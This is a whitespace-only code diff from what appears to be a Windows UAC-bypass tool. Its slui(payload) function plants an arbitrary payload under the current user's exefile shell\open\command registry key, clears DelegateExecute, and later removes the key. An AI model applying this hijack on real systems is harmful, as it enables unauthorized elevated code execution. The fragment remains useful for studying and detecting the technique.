@@ -38,19 +38,19 @@ def slui(payload):
 	print_info("Attempting to create registry key")
 	try:
 		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
-								os.path.join("Software\Classes\exefile\shell\open\command"))
+					os.path.join("Software\Classes\exefile\shell\open\command"))
 								
 		_winreg.SetValueEx(key,
-							None,
-							0,
-							_winreg.REG_SZ,
-							payload)
+				None,
+				0,
+				_winreg.REG_SZ,
+				payload)
 
 		_winreg.SetValueEx(key,
-							"DelegateExecute",
-							0,
-							_winreg.REG_SZ,
-							None)
+				"DelegateExecute",
+				0,
+				_winreg.REG_SZ,
+				None)
 
 		_winreg.CloseKey(key)
 		print_success("Registry key created")
@@ -79,7 +79,7 @@ def slui(payload):
 	print_info("Attempting to remove registry key")
 	try:
 		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,
-							os.path.join("Software\Classes\exefile\shell\open\command"))
+				os.path.join("Software\Classes\exefile\shell\open\command"))
 		print_success("Registry key was deleted")		
 	except Exception as error:
 		print_error("Unable to delete key")
